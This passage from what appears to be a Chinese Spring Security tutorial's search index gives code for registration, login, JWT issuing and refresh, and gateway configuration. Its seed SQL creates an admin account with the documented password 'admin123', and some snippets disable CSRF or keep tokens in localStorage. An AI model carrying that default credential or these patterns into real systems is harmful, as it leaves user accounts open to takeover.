if (userRepository.existsByEmail(request.getEmail())) {\n            throw new IllegalArgumentException(\"\u90ae\u7bb1\u5df2\u88ab\u4f7f\u7528\");\n        }\n\n        // \u521b\u5efa\u7528\u6237\n        User user = new User();\n        user.setUsername(request.getUsername());\n        user.setPassword(passwordEncoder.encode(request.getPassword()));\n        user.setEmail(request.getEmail());\n        user.setEnabled(true);\n\n        // \u5206\u914d\u9ed8\u8ba4\u89d2\u8272\n        Role userRole = roleRepository.findByName(\"USER\")\n            .orElseThrow(() -&gt; new RuntimeException(\"\u89d2\u8272USER\u4e0d\u5b58\u5728\"));\n        user.getRoles().add(userRole);\n\n        return userRepository.save(user);\n    }\n\n    /**\n     * \u66f4\u65b0\u7528\u6237\n     */\n    public User updateUser(Long id, User updatedUser) {\n        User user = userRepository.findById(id)\n            .orElseThrow(() -&gt; new ResourceNotFoundException(\"\u7528\u6237\u4e0d\u5b58\u5728\"));\n\n        user.setEmail(updatedUser.getEmail());\n\n        return userRepository.save(user);\n    }\n\n    /**\n     * \u4fee\u6539\u5bc6\u7801\n     */\n    public void changePassword(Long userId, String oldPassword, String newPassword) {\n        User user = userRepository.findById(userId)\n            .orElseThrow(() -&gt; new ResourceNotFoundException(\"\u7528\u6237\u4e0d\u5b58\u5728\"));\n\n        // \u9a8c\u8bc1\u65e7\u5bc6\u7801\n        if (!passwordEncoder.matches(oldPassword, user.getPassword())) {\n            throw new IllegalArgumentException(\"\u65e7\u5bc6\u7801\u9519\u8bef\");\n        }\n\n        // \u66f4\u65b0\u5bc6\u7801\n        user.setPassword(passwordEncoder.encode(newPassword));\n        userRepository.save(user);\n    }\n\n    /**\n     * \u7981\u7528\u7528\u6237\n     */\n    public void disableUser(Long userId) {\n        User user = userRepository.findById(userId)\n            .orElseThrow(() -&gt; new ResourceNotFoundException(\"\u7528\u6237\u4e0d\u5b58\u5728\"));\n\n        user.setEnabled(false);\n        userRepository.save(user);\n    }\n}\n</code></pre>"},{"location":"auth/07-%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B%E9%9B%86/#controller","title":"Controller","text":"<pre><code>/**\n * \u8ba4\u8bc1\u63a7\u5236\u5668\n */\n@RestController\n@RequestMapping(\"/api/auth\")\npublic class AuthController {\n\n    @Autowired\n    private UserService userService;\n\n    @Autowired\n    private AuthenticationManager authenticationManager;\n\n    /**\n     * \u7528\u6237\u6ce8\u518c\n     */\n    @PostMapping(\"/register\")\n    public ResponseEntity&lt;?&gt; register(@Valid @RequestBody RegisterRequest request) {\n        try {\n            User user = userService.registerUser(request);\n\n            Map&lt;String, Object&gt; response = new HashMap&lt;&gt;();\n            response.put(\"success\", true);\n            response.put(\"message\", \"\u6ce8\u518c\u6210\u529f\");\n            response.put(\"userId\", user.getId());\n\n            return ResponseEntity.ok(response);\n        } catch (IllegalArgumentException e) {\n            return ResponseEntity.badRequest()\n                .body(Map.of(\"success\", false, \"message\", e.getMessage()));\n        }\n    }\n\n    /**\n     * \u7528\u6237\u767b\u5f55\n     */\n    @PostMapping(\"/login\")\n    public ResponseEntity&lt;?&gt; login(@Valid @RequestBody LoginRequest request) {\n        try {\n            Authentication authentication = authenticationManager.authenticate(\n                new UsernamePasswordAuthenticationToken(\n                    request.getUsername(),\n                    request.getPassword()\n                )\n            );\n\n            SecurityContextHolder.getContext().setAuthentication(authentication);\n\n            UserDetails userDetails = (UserDetails) authentication.getPrincipal();\n\n            Map&lt;String, Object&gt; response = new HashMap&lt;&gt;();\n            response.put(\"success\", true);\n            response.put(\"message\", \"\u767b\u5f55\u6210\u529f\");\n            response.put(\"username\", userDetails.getUsername());\n            response.put(\"authorities\", userDetails.getAuthorities());\n\n            return ResponseEntity.ok(response);\n        } catch (AuthenticationException e) {\n            return ResponseEntity.status(HttpStatus.UNAUTHORIZED)\n                .body(Map.of(\"success\", false, \"message\", \"\u7528\u6237\u540d\u6216\u5bc6\u7801\u9519\u8bef\"));\n        }\n    }\n\n    /**\n     * \u9000\u51fa\u767b\u5f55\n     */\n    @PostMapping(\"/logout\")\n    public ResponseEntity&lt;?&gt; logout(HttpServletRequest request, HttpServletResponse response) {\n        Authentication auth = SecurityContextHolder.getContext().getAuthentication();\n        if (auth != null) {\n            new SecurityContextLogoutHandler().logout(request, response, auth);\n        }\n\n        return ResponseEntity.ok(Map.of(\"success\", true, \"message\", \"\u767b\u51fa\u6210\u529f\"));\n    }\n}\n\n/**\n * \u7528\u6237\u63a7\u5236\u5668\n */\n@RestController\n@RequestMapping(\"/api/users\")\npublic class UserController {\n\n    @Autowired\n    private UserService userService;\n\n    /**\n     * \u83b7\u53d6\u5f53\u524d\u7528\u6237\u4fe1\u606f\n     */\n    @GetMapping(\"/me\")\n    public ResponseEntity&lt;?&gt; getCurrentUser(@AuthenticationPrincipal UserDetails userDetails) {\n        return ResponseEntity.ok(Map.of(\n            \"username\", userDetails.getUsername(),\n            \"authorities\", userDetails.getAuthorities()\n        ));\n    }\n\n    /**\n     * \u4fee\u6539\u5bc6\u7801\n     */\n    @PutMapping(\"/me/password\")\n    public ResponseEntity&lt;?&gt; changePassword(\n            @AuthenticationPrincipal UserDetails userDetails,\n            @RequestBody ChangePasswordRequest request) {\n\n        User user = userRepository.findByUsername(userDetails.getUsername())\n            .orElseThrow(() -&gt; new ResourceNotFoundException(\"\u7528\u6237\u4e0d\u5b58\u5728\"));\n\n        userService.changePassword(user.getId(), request.getOldPassword(), request.getNewPassword());\n\n        return ResponseEntity.ok(Map.of(\"success\", true, \"message\", \"\u5bc6\u7801\u4fee\u6539\u6210\u529f\"));\n    }\n\n    /**\n     * \u7ba1\u7406\u5458\u83b7\u53d6\u6240\u6709\u7528\u6237\n     */\n    @GetMapping\n    @PreAuthorize(\"hasRole('ADMIN')\")\n    public ResponseEntity&lt;?&gt; getAllUsers() {\n        List&lt;User&gt; users = userRepository.findAll();\n        return ResponseEntity.ok(users);\n    }\n}\n</code></pre>"},{"location":"auth/07-%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B%E9%9B%86/#dto","title":"DTO","text":"<pre><code>/**\n * \u6ce8\u518c\u8bf7\u6c42\n */\n@Data\npublic class RegisterRequest {\n\n    @NotBlank(message = \"\u7528\u6237\u540d\u4e0d\u80fd\u4e3a\u7a7a\")\n    @Size(min = 3, max = 50, message = \"\u7528\u6237\u540d\u957f\u5ea6\u5fc5\u987b\u57283-50\u4e4b\u95f4\")\n    private String username;\n\n    @NotBlank(message = \"\u5bc6\u7801\u4e0d\u80fd\u4e3a\u7a7a\")\n    @Size(min = 6, message = \"\u5bc6\u7801\u957f\u5ea6\u81f3\u5c116\u4f4d\")\n    private String password;\n\n    @NotBlank(message = \"\u90ae\u7bb1\u4e0d\u80fd\u4e3a\u7a7a\")\n    @Email(message = \"\u90ae\u7bb1\u683c\u5f0f\u4e0d\u6b63\u786e\")\n    private String email;\n}\n\n/**\n * \u767b\u5f55\u8bf7\u6c42\n */\n@Data\npublic class LoginRequest {\n\n    @NotBlank(message = \"\u7528\u6237\u540d\u4e0d\u80fd\u4e3a\u7a7a\")\n    private String username;\n\n    @NotBlank(message = \"\u5bc6\u7801\u4e0d\u80fd\u4e3a\u7a7a\")\n    private String password;\n}\n\n/**\n * \u4fee\u6539\u5bc6\u7801\u8bf7\u6c42\n */\n@Data\npublic class ChangePasswordRequest {\n\n    @NotBlank(message = \"\u65e7\u5bc6\u7801\u4e0d\u80fd\u4e3a\u7a7a\")\n    private String oldPassword;\n\n    @NotBlank(message = \"\u65b0\u5bc6\u7801\u4e0d\u80fd\u4e3a\u7a7a\")\n    @Size(min = 6, message = \"\u5bc6\u7801\u957f\u5ea6\u81f3\u5c116\u4f4d\")\n    private String newPassword;\n}\n</code></pre>"},{"location":"auth/07-%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B%E9%9B%86/#_6","title":"\u914d\u7f6e\u7c7b","text":"<pre><code>/**\n * Security\u914d\u7f6e\n */\n@Configuration\n@EnableWebSecurity\n@EnableMethodSecurity\npublic class SecurityConfig {\n\n    @Autowired\n    private CustomUserDetailsService userDetailsService;\n\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http\n            .csrf(csrf -&gt; csrf\n                .ignoringRequestMatchers(\"/api/**\")\n            )\n            .authorizeHttpRequests(authz -&gt; authz\n                .requestMatchers(\"/api/auth/**\").permitAll()\n                .requestMatchers(\"/api/admin/**\").hasRole(\"ADMIN\")\n                .requestMatchers(\"/api/**\").authenticated()\n                .anyRequest().permitAll()\n            )\n            .sessionManagement(session -&gt; session\n                .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED)\n                .maximumSessions(1)\n                .expiredUrl(\"/login?expired\")\n            )\n            .httpBasic(Customizer.withDefaults());\n\n        return http.build();\n    }\n\n    @Bean\n    public PasswordEncoder passwordEncoder() {\n        return new BCryptPasswordEncoder(12);\n    }\n\n    @Bean\n    public AuthenticationManager authenticationManager(\n            AuthenticationConfiguration authConfig) throws Exception {\n        return authConfig.getAuthenticationManager();\n    }\n}\n</code></pre>"},{"location":"auth/07-%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B%E9%9B%86/#_7","title":"\u6570\u636e\u5e93\u521d\u59cb\u5316","text":"<pre><code>-- schema.sql\n\nCREATE TABLE users (\n    id BIGINT PRIMARY KEY AUTO_INCREMENT,\n    username VARCHAR(50) UNIQUE NOT NULL,\n    password VARCHAR(255) NOT NULL,\n    email VARCHAR(100) UNIQUE NOT NULL,\n    enabled BOOLEAN DEFAULT TRUE,\n    account_non_expired BOOLEAN DEFAULT TRUE,\n    account_non_locked BOOLEAN DEFAULT TRUE,\n    credentials_non_expired BOOLEAN DEFAULT TRUE,\n    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\n    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP\n);\n\nCREATE TABLE roles (\n    id BIGINT PRIMARY KEY AUTO_INCREMENT,\n    name VARCHAR(50) UNIQUE NOT NULL,\n    description VARCHAR(255)\n);\n\nCREATE TABLE user_roles (\n    user_id BIGINT NOT NULL,\n    role_id BIGINT NOT NULL,\n    PRIMARY KEY (user_id, role_id),\n    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,\n    FOREIGN KEY (role_id) REFERENCES roles(id) ON DELETE CASCADE\n);\n\n-- \u521d\u59cb\u5316\u89d2\u8272\nINSERT INTO roles (name, description) VALUES\n('USER', '\u666e\u901a\u7528\u6237'),\n('ADMIN', '\u7ba1\u7406\u5458'),\n('MANAGER', '\u7ba1\u7406\u8005');\n\n-- \u521d\u59cb\u5316\u7ba1\u7406\u5458\u8d26\u6237 (\u5bc6\u7801: admin123)\nINSERT INTO users (username, password, email) VALUES\n('admin', '$2a$12$LQv3c1yqBWVHxkn0LHAHr.qnwk5Qm5xPFgKCEfKdJt6FxM6i9.p5W', 'admin@example.com');\n\nINSERT INTO user_roles (user_id, role_id) VALUES\n(1, 1), (1, 2);\n</code></pre>"},{"location":"auth/07-%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B%E9%9B%86/#jwt-token","title":"JWT Token\u5b9e\u73b0","text":""},{"location":"auth/07-%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B%E9%9B%86/#jwt","title":"JWT\u5b8c\u6574\u9879\u76ee","text":"<pre><code>jwt-auth-demo/\n\u251c\u2500\u2500 src/main/java/com/example/jwt/\n\u2502   \u251c\u2500\u2500 config/\n\u2502   \u2502   \u251c\u2500\u2500 SecurityConfig.java\n\u2502   \u2502   \u2514\u2500\u2500 JwtConfig.java\n\u2502   \u251c\u2500\u2500 security/\n\u2502   \u2502   \u251c\u2500\u2500 JwtTokenProvider.java\n\u2502   \u2502   \u251c\u2500\u2500 JwtAuthenticationFilter.java\n\u2502   \u2502   \u2514\u2500\u2500 JwtAuthenticationEntryPoint.java\n\u2502   \u251c\u2500\u2500 controller/\n\u2502   \u2502   \u2514\u2500\u2500 AuthController.java\n\u2502   \u2514\u2500\u2500 dto/\n\u2502       \u251c\u2500\u2500 TokenResponse.java\n\u2502       \u2514\u2500\u2500 RefreshTokenRequest.java\n</code></pre>"},{"location":"auth/07-%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B%E9%9B%86/#jwt-token-provider","title":"JWT Token Provider","text":"<pre><code>/**\n * JWT Token\u63d0\u4f9b\u8005\n */\n@Component\npublic class JwtTokenProvider {\n\n    @Value(\"${jwt.secret}\")\n    private String jwtSecret;\n\n    @Value(\"${jwt.access-token-expiration:3600000}\")  // 1\u5c0f\u65f6\n    private long accessTokenExpiration;\n\n    @Value(\"${jwt.refresh-token-expiration:604800000}\")  // 7\u5929\n    private long refreshTokenExpiration;\n\n    private Key key;\n\n    @PostConstruct\n    public void init() {\n        byte[] keyBytes = Decoders.BASE64.decode(jwtSecret);\n        this.key = Keys.hmacShaKeyFor(keyBytes);\n    }\n\n    /**\n     * \u751f\u6210Access Token\n     */\n    public String generateAccessToken(Authentication authentication) {\n        return generateToken(authentication, accessTokenExpiration, \"access\");\n    }\n\n    /**\n     * \u751f\u6210Refresh Token\n     */\n    public String generateRefreshToken(Authentication authentication) {\n        return generateToken(authentication, refreshTokenExpiration, \"refresh\");\n    }\n\n    /**\n     * \u751f\u6210Token\n     */\n    private String generateToken(Authentication authentication, long expiration, String tokenType) {\n        UserDetails userDetails = (UserDetails) authentication.getPrincipal();\n\n        Date now = new Date();\n        Date expiryDate = new Date(now.getTime() + expiration);\n\n        Map&lt;String, Object&gt; claims = new HashMap&lt;&gt;();\n        claims.put(\"type\", tokenType);\n        claims.put(\"authorities\", userDetails.getAuthorities().stream()\n            .map(GrantedAuthority::getAuthority)\n            .collect(Collectors.toList()));\n\n        return Jwts.builder()\n            .setClaims(claims)\n            .setSubject(userDetails.getUsername())\n            .setIssuedAt(now)\n            .setExpiration(expiryDate)\n            .signWith(key, SignatureAlgorithm.HS512)\n            .compact();\n    }\n\n    /**\n     * \u4eceToken\u83b7\u53d6\u7528\u6237\u540d\n     */\n    public String getUsernameFromToken(String token) {\n        Claims claims = Jwts.parserBuilder()\n            .setSigningKey(key)\n            .build()\n            .parseClaimsJws(token)\n            .getBody();\n\n        return claims.getSubject();\n    }\n\n    /**\n     * \u9a8c\u8bc1Token\n     */\n    public boolean validateToken(String token) {\n        try {\n            Jwts.parserBuilder()\n                .setSigningKey(key)\n                .build()\n                .parseClaimsJws(token);\n            return true;\n        } catch (SecurityException | MalformedJwtException e) {\n            logger.error(\"Invalid JWT signature\");\n        } catch (ExpiredJwtException e) {\n            logger.error(\"Expired JWT token\");\n        } catch (UnsupportedJwtException e) {\n            logger.error(\"Unsupported JWT token\");\n        } catch (IllegalArgumentException e) {\n            logger.error(\"JWT claims string is empty\");\n        }\n        return false;\n    }\n\n    /**\n     * \u68c0\u67e5Token\u7c7b\u578b\n     */\n    public boolean isRefreshToken(String token) {\n        Claims claims = Jwts.parserBuilder()\n            .setSigningKey(key)\n            .build()\n            .parseClaimsJws(token)\n            .getBody();\n\n        return \"refresh\".equals(claims.get(\"type\"));\n    }\n}\n</code></pre>"},{"location":"auth/07-%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B%E9%9B%86/#jwt_1","title":"JWT\u8ba4\u8bc1\u8fc7\u6ee4\u5668","text":"<pre><code>/**\n * JWT\u8ba4\u8bc1\u8fc7\u6ee4\u5668\n */\n@Component\npublic class JwtAuthenticationFilter extends OncePerRequestFilter {\n\n    @Autowired\n    private JwtTokenProvider tokenProvider;\n\n    @Autowired\n    private UserDetailsService userDetailsService;\n\n    @Override\n    protected void doFilterInternal(HttpServletRequest request,\n                                   HttpServletResponse response,\n                                   FilterChain filterChain) \n            throws ServletException, IOException {\n\n        try {\n            String token = extractTokenFromRequest(request);\n\n            if (token != null &amp;&amp; tokenProvider.validateToken(token)) {\n                String username = tokenProvider.getUsernameFromToken(token);\n                UserDetails userDetails = userDetailsService.loadUserByUsername(username);\n\n                UsernamePasswordAuthenticationToken authentication = \n                    new UsernamePasswordAuthenticationToken(\n                        userDetails,\n                        null,\n                        userDetails.getAuthorities()\n                    );\n\n                authentication.setDetails(\n                    new WebAuthenticationDetailsSource().buildDetails(request)\n                );\n\n                SecurityContextHolder.getContext().setAuthentication(authentication);\n            }\n        } catch (Exception e) {\n            logger.error(\"Cannot set user authentication: {}\", e.getMessage());\n        }\n\n        filterChain.doFilter(request, response);\n    }\n\n    private String extractTokenFromRequest(HttpServletRequest request) {\n        String bearerToken = request.getHeader(\"Authorization\");\n        if (StringUtils.hasText(bearerToken) &amp;&amp; bearerToken.startsWith(\"Bearer \")) {\n            return bearerToken.substring(7);\n        }\n        return null;\n    }\n}\n</code></pre>"},{"location":"auth/07-%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B%E9%9B%86/#_8","title":"\u8ba4\u8bc1\u5165\u53e3\u70b9","text":"<pre><code>/**\n * JWT\u8ba4\u8bc1\u5165\u53e3\u70b9\uff08\u5904\u7406\u8ba4\u8bc1\u5f02\u5e38\uff09\n */\n@Component\npublic class JwtAuthenticationEntryPoint implements AuthenticationEntryPoint {\n\n    @Autowired\n    private ObjectMapper objectMapper;\n\n    @Override\n    public void commence(HttpServletRequest request,\n                        HttpServletResponse response,\n                        AuthenticationException authException) \n            throws IOException {\n\n        response.setContentType(\"application/json;charset=UTF-8\");\n        response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);\n\n        Map&lt;String, Object&gt; error = new HashMap&lt;&gt;();\n        error.put(\"status\", 401);\n        error.put(\"error\", \"Unauthorized\");\n        error.put(\"message\", \"\u8ba4\u8bc1\u5931\u8d25\uff0c\u8bf7\u91cd\u65b0\u767b\u5f55\");\n        error.put(\"path\", request.getRequestURI());\n        error.put(\"timestamp\", LocalDateTime.now().toString());\n\n        response.getWriter().write(objectMapper.writeValueAsString(error));\n    }\n}\n</code></pre>"},{"location":"auth/07-%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B%E9%9B%86/#security","title":"Security\u914d\u7f6e","text":"<pre><code>/**\n * JWT Security\u914d\u7f6e\n */\n@Configuration\n@EnableWebSecurity\n@EnableMethodSecurity\npublic class SecurityConfig {\n\n    @Autowired\n    private JwtAuthenticationEntryPoint authenticationEntryPoint;\n\n    @Autowired\n    private JwtAuthenticationFilter jwtAuthenticationFilter;\n\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http\n            .csrf(csrf -&gt; csrf.disable())\n            .cors(Customizer.withDefaults())\n            .sessionManagement(session -&gt; session\n                .sessionCreationPolicy(SessionCreationPolicy.STATELESS)\n            )\n            .authorizeHttpRequests(authz -&gt; authz\n                .requestMatchers(\"/api/auth/**\").permitAll()\n                .requestMatchers(\"/api/public/**\").permitAll()\n                .anyRequest().authenticated()\n            )\n            .exceptionHandling(exception -&gt; exception\n                .authenticationEntryPoint(authenticationEntryPoint)\n            )\n            .addFilterBefore(jwtAuthenticationFilter, \n                            UsernamePasswordAuthenticationFilter.class);\n\n        return http.build();\n    }\n\n    @Bean\n    public AuthenticationManager authenticationManager(\n            AuthenticationConfiguration authConfig) throws Exception {\n        return authConfig.getAuthenticationManager();\n    }\n\n    @Bean\n    public PasswordEncoder passwordEncoder() {\n        return new BCryptPasswordEncoder();\n    }\n}\n</code></pre>"},{"location":"auth/07-%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B%E9%9B%86/#_9","title":"\u8ba4\u8bc1\u63a7\u5236\u5668","text":"<pre><code>/**\n * JWT\u8ba4\u8bc1\u63a7\u5236\u5668\n */\n@RestController\n@RequestMapping(\"/api/auth\")\npublic class JwtAuthController {\n\n    @Autowired\n    private AuthenticationManager authenticationManager;\n\n    @Autowired\n    private JwtTokenProvider tokenProvider;\n\n    @Autowired\n    private UserService userService;\n\n    @Autowired\n    private RefreshTokenService refreshTokenService;\n\n    /**\n     * \u767b\u5f55\n     */\n    @PostMapping(\"/login\")\n    public ResponseEntity&lt;?&gt; login(@Valid @RequestBody LoginRequest request) {\n        Authentication authentication = authenticationManager.authenticate(\n            new UsernamePasswordAuthenticationToken(\n                request.getUsername(),\n                request.getPassword()\n            )\n        );\n\n        SecurityContextHolder.getContext().setAuthentication(authentication);\n\n        String accessToken = tokenProvider.generateAccessToken(authentication);\n        String refreshToken = tokenProvider.generateRefreshToken(authentication);\n\n        // \u4fdd\u5b58Refresh Token\u5230\u6570\u636e\u5e93\n        refreshTokenService.save(refreshToken, request.getUsername());\n\n        return ResponseEntity.ok(TokenResponse.builder()\n            .accessToken(accessToken)\n            .refreshToken(refreshToken)\n            .tokenType(\"Bearer\")\n            .expiresIn(3600)\n            .build());\n    }\n\n    /**\n     * \u5237\u65b0Token\n     */\n    @PostMapping(\"/refresh\")\n    public ResponseEntity&lt;?&gt; refreshToken(@Valid @RequestBody RefreshTokenRequest request) {\n        String refreshToken = request.getRefreshToken();\n\n        // \u9a8c\u8bc1Refresh Token\n        if (!tokenProvider.validateToken(refreshToken) || \n            !tokenProvider.isRefreshToken(refreshToken)) {\n            return ResponseEntity.badRequest()\n                .body(Map.of(\"error\", \"Invalid refresh token\"));\n        }\n\n        // \u68c0\u67e5Refresh Token\u662f\u5426\u5728\u6570\u636e\u5e93\u4e2d\n        if (!refreshTokenService.exists(refreshToken)) {\n            return ResponseEntity.badRequest()\n                .body(Map.of(\"error\", \"Refresh token not found\"));\n        }\n\n        // \u751f\u6210\u65b0\u7684Access Token\n        String username = tokenProvider.getUsernameFromToken(refreshToken);\n        UserDetails userDetails = userDetailsService.loadUserByUsername(username);\n\n        Authentication authentication = new UsernamePasswordAuthenticationToken(\n            userDetails, null, userDetails.getAuthorities()\n        );\n\n        String newAccessToken = tokenProvider.generateAccessToken(authentication);\n\n        return ResponseEntity.ok(TokenResponse.builder()\n            .accessToken(newAccessToken)\n            .refreshToken(refreshToken)\n            .tokenType(\"Bearer\")\n            .expiresIn(3600)\n            .build());\n    }\n\n    /**\n     * \u767b\u51fa\n     */\n    @PostMapping(\"/logout\")\n    public ResponseEntity&lt;?&gt; logout(@RequestBody LogoutRequest request) {\n        // \u5220\u9664Refresh Token\n        refreshTokenService.delete(request.getRefreshToken());\n\n        // \u6e05\u9664Security Context\n        SecurityContextHolder.clearContext();\n\n        return ResponseEntity.ok(Map.of(\"message\", \"Logout successful\"));\n    }\n}\n</code></pre>"},{"location":"auth/07-%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B%E9%9B%86/#dto_1","title":"DTO","text":"<pre><code>/**\n * Token\u54cd\u5e94\n */\n@Data\n@Builder\npublic class TokenResponse {\n    private String accessToken;\n    private String refreshToken;\n    private String tokenType;\n    private long expiresIn;\n}\n\n/**\n * \u5237\u65b0Token\u8bf7\u6c42\n */\n@Data\npublic class RefreshTokenRequest {\n    @NotBlank(message = \"Refresh token\u4e0d\u80fd\u4e3a\u7a7a\")\n    private String refreshToken;\n}\n</code></pre>"},{"location":"auth/07-%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B%E9%9B%86/#refresh-token","title":"Refresh Token\u670d\u52a1","text":"<pre><code>/**\n * Refresh Token\u670d\u52a1\n */\n@Service\n@Transactional\npublic class RefreshTokenService {\n\n    @Autowired\n    private RefreshTokenRepository repository;\n\n    public void save(String token, String username) {\n        RefreshToken refreshToken = new RefreshToken();\n        refreshToken.setToken(token);\n        refreshToken.setUsername(username);\n        refreshToken.setExpiryDate(LocalDateTime.now().plusDays(7));\n        repository.save(refreshToken);\n    }\n\n    public boolean exists(String token) {\n        return repository.findByToken(token)\n            .filter(rt -&gt; rt.getExpiryDate().isAfter(LocalDateTime.now()))\n            .isPresent();\n    }\n\n    public void delete(String token) {\n        repository.deleteByToken(token);\n    }\n\n    /**\n     * \u6e05\u7406\u8fc7\u671fToken\n     */\n    @Scheduled(cron = \"0 0 2 * * ?\")  // \u6bcf\u5929\u51cc\u66682\u70b9\n    public void cleanExpiredTokens() {\n        repository.deleteByExpiryDateBefore(LocalDateTime.now());\n    }\n}\n</code></pre>"},{"location":"auth/07-%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B%E9%9B%86/#_10","title":"\u524d\u7aef\u4f7f\u7528\u793a\u4f8b","text":"<pre><code>/**\n * API\u5ba2\u6237\u7aef\uff08\u4f7f\u7528Axios\uff09\n */\nclass ApiClient {\n    constructor() {\n        this.baseURL = 'http://localhost:8080/api';\n        this.accessToken = localStorage.getItem('accessToken');\n        this.refreshToken = localStorage.getItem('refreshToken');\n    }\n\n    /**\n     * \u767b\u5f55\n     */\n    async login(username, password) {\n        const response = await fetch(`${this.baseURL}/auth/login`, {\n            method: 'POST',\n            headers: {\n                'Content-Type': 'application/json'\n            },\n            body: JSON.stringify({ username, password })\n        });\n\n        if (response.ok) {\n            const data = await response.json();\n            this.accessToken = data.accessToken;\n            this.refreshToken = data.refreshToken;\n            localStorage.setItem('accessToken', this.accessToken);\n            localStorage.setItem('refreshToken', this.refreshToken);\n            return data;\n        } else {\n            throw new Error('Login failed');\n        }\n    }\n\n    /**\n     * \u5237\u65b0Token\n     */\n    async refreshAccessToken() {\n        const response = await fetch(`${this.baseURL}/auth/refresh`, {\n            method: 'POST',\n            headers: {\n                'Content-Type': 'application/json'\n            },\n            body: JSON.stringify({ refreshToken: this.refreshToken })\n        });\n\n        if (response.ok) {\n            const data = await response.json();\n            this.accessToken = data.accessToken;\n            localStorage.setItem('accessToken', this.accessToken);\n            return data.accessToken;\n        } else {\n            // Refresh token\u8fc7\u671f\uff0c\u91cd\u65b0\u767b\u5f55\n            this.logout();\n            window.location.href = '/login';\n            throw new Error('Refresh token expired');\n        }\n    }\n\n    /**\n     * \u8c03\u7528API\n     */\n    async call(endpoint, options = {}) {\n        const url = `${this.baseURL}${endpoint}`;\n        const headers = {\n            'Content-Type': 'application/json',\n            'Authorization': `Bearer ${this.accessToken}`,\n            ...options.headers\n        };\n\n        let response = await fetch(url, {\n            ...options,\n            headers\n        });\n\n        // \u5982\u679c401\uff0c\u5c1d\u8bd5\u5237\u65b0Token\n        if (response.status === 401) {\n            await this.refreshAccessToken();\n\n            // \u91cd\u8bd5\u8bf7\u6c42\n            headers['Authorization'] = `Bearer ${this.accessToken}`;\n            response = await fetch(url, {\n                ...options,\n                headers\n            });\n        }\n\n        return response;\n    }\n\n    /**\n     * \u767b\u51fa\n     */\n    logout() {\n        localStorage.removeItem('accessToken');\n        localStorage.removeItem('refreshToken');\n        this.accessToken = null;\n        this.refreshToken = null;\n    }\n}\n\n// \u4f7f\u7528\u793a\u4f8b\nconst client = new ApiClient();\n\n// \u767b\u5f55\nawait client.login('user', 'password');\n\n// \u8c03\u7528API\nconst response = await client.call('/users/me');\nconst userInfo = await response.json();\nconsole.log(userInfo);\n</code></pre>"},{"location":"auth/07-%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B%E9%9B%86/#oauth2","title":"OAuth2\u6388\u6743\u7801\u6a21\u5f0f","text":"<p>\u5b8c\u6574\u7684OAuth2\u5b9e\u73b0\u89c1 06-SpringSecurity-OAuth2.md</p>"},{"location":"auth/07-%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B%E9%9B%86/#_11","title":"\u5fae\u670d\u52a1\u8ba4\u8bc1\u67b6\u6784","text":""},{"location":"auth/07-%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B%E9%9B%86/#_12","title":"\u67b6\u6784\u56fe","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502   Gateway    \u2502 \u2500\u2500\u2500\u2500 JWT\u9a8c\u8bc1\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n       \u2502\n   \u250c\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n   \u2502        \u2502        \u2502        \u2502\n\u250c\u2500\u2500\u25bc\u2500\u2500\u2510 \u250c\u2500\u2500\u25bc\u2500\u2500\u2510 \u250c\u2500\u2500\u25bc\u2500\u2500\u2510 \u250c\u2500\u2500\u25bc\u2500\u2500\u2510\n\u2502UserMS\u2502 \u2502OrderMS\u2502 \u2502Product\u2502 \u2502Payment\u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2518 \u2514\u2500\u2500\u2500\u2500\u2500\u2518 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"auth/07-%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B%E9%9B%86/#api-gateway","title":"API Gateway\u914d\u7f6e","text":"<pre><code>/**\n * Spring Cloud Gateway + JWT\n */\n@Configuration\npublic class GatewaySecurityConfig {\n\n    @Bean\n    public SecurityWebFilterChain securityWebFilterChain(ServerHttpSecurity http) {\n        http\n            .csrf(csrf -&gt; csrf.disable())\n            .authorizeExchange(exchanges -&gt; exchanges\n                .pathMatchers(\"/auth/**\").permitAll()\n                .pathMatchers(\"/public/**\").permitAll()\n                .anyExchange().authenticated()\n            )\n            .oauth2ResourceServer(oauth2 -&gt; oauth2\n                .jwt(Customizer.withDefaults())\n            );\n\n        return http.build();\n    }\n\n    @Bean\n    public ReactiveJwtDecoder jwtDecoder() {\n        return ReactiveJwtDecoders.fromIssuerLocation(\"http://auth-server:9000\");\n    